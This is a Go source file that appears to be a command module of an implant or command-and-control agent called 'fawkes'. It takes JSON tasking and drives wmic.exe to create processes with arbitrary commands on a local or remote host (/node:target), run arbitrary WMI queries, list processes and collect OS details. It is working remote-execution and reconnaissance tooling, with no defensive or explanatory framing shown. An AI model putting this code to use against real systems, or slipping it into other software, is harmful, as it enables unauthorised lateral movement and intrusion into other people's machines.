//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"os/exec"
	"strings"

	"fawkes/pkg/structs"
)

type WmiCommand struct{}

func (c *WmiCommand) Name() string {
	return "wmi"
}

func (c *WmiCommand) Description() string {
	return "Execute WMI queries and commands via wmic.exe"
}

type wmiArgs struct {
	Action  string `json:"action"`
	Target  string `json:"target"`
	Command string `json:"command"`
	Query   string `json:"query"`
}

func (c *WmiCommand) Execute(task structs.Task) structs.CommandResult {
	var args wmiArgs

	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required. Actions: execute, query, process-list, os-info",
			Status:    "error",
			Completed: true,
		}
	}

	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	switch strings.ToLower(args.Action) {
	case "execute":
		return wmiExecute(args.Target, args.Command)
	case "query":
		return wmiQuery(args.Target, args.Query)
	case "process-list":
		return wmiProcessList(args.Target)
	case "os-info":
		return wmiOsInfo(args.Target)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s\nAvailable: execute, query, process-list, os-info", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

// wmiExecute creates a process on the target via WMI
func wmiExecute(target, command string) structs.CommandResult {
	if command == "" {
		return structs.CommandResult{
			Output:    "Error: command parameter is required for execute action",
			Status:    "error",
			Completed: true,
		}
	}

	wmicArgs := []string{"process", "call", "create", command}
	if target != "" {
		wmicArgs = append([]string{"/node:" + target}, wmicArgs...)
	}

	cmd := exec.Command("wmic.exe", wmicArgs...)
	out, err := cmd.CombinedOutput()
	output := strings.TrimSpace(string(out))
	if err != nil && output == "" {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error executing WMI command: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("WMI Process Create:\n%s", output),
		Status:    "success",
		Completed: true,
	}
}

// wmiQuery runs an arbitrary WQL query
func wmiQuery(target, query string) structs.CommandResult {
	if query == "" {
		return structs.CommandResult{
			Output:    "Error: query parameter is required for query action",
			Status:    "error",
			Completed: true,
		}
	}

	// Use /format:list for readable output
	wmicArgs := []string{"path", "Win32_Process", "get", "/format:list"}

	// Split the WQL-like query into wmic path and fields
	// Support direct wmic syntax: "os get caption,version"
	parts := strings.Fields(query)
	if len(parts) >= 1 {
		wmicArgs = parts
	}

	if target != "" {
		wmicArgs = append([]string{"/node:" + target}, wmicArgs...)
	}

	cmd := exec.Command("wmic.exe", wmicArgs...)
	out, err := cmd.CombinedOutput()
	output := strings.TrimSpace(string(out))
	if err != nil && output == "" {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error running WMI query: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("WMI Query Result:\n%s", output),
		Status:    "success",
		Completed: true,
	}
}

// wmiProcessList lists processes on the target
func wmiProcessList(target string) structs.CommandResult {
	wmicArgs := []string{"process", "list", "brief", "/format:list"}
	if target != "" {
		wmicArgs = append([]string{"/node:" + target}, wmicArgs...)
	}

	cmd := exec.Command("wmic.exe", wmicArgs...)
	out, err := cmd.CombinedOutput()
	output := strings.TrimSpace(string(out))
	if err != nil && output == "" {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error listing processes: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("WMI Process List:\n%s", output),
		Status:    "success",
		Completed: true,
	}
}

// wmiOsInfo gets OS information from the target
func wmiOsInfo(target string) structs.CommandResult {
	wmicArgs := []string{"os", "get", "Caption,Version,BuildNumber,OSArchitecture,LastBootUpTime,TotalVisibleMemorySize,FreePhysicalMemory", "/format:list"}
	if target != "" {
		wmicArgs = append([]string{"/node:" + target}, wmicArgs...)
	}

	cmd := exec.Command("wmic.exe", wmicArgs...)
	out, err := cmd.CombinedOutput()
	output := strings.TrimSpace(string(out))
	if err != nil && output == "" {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error getting OS info: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("WMI OS Info:\n%s", output),
		Status:    "success",
		Completed: true,
	}
}
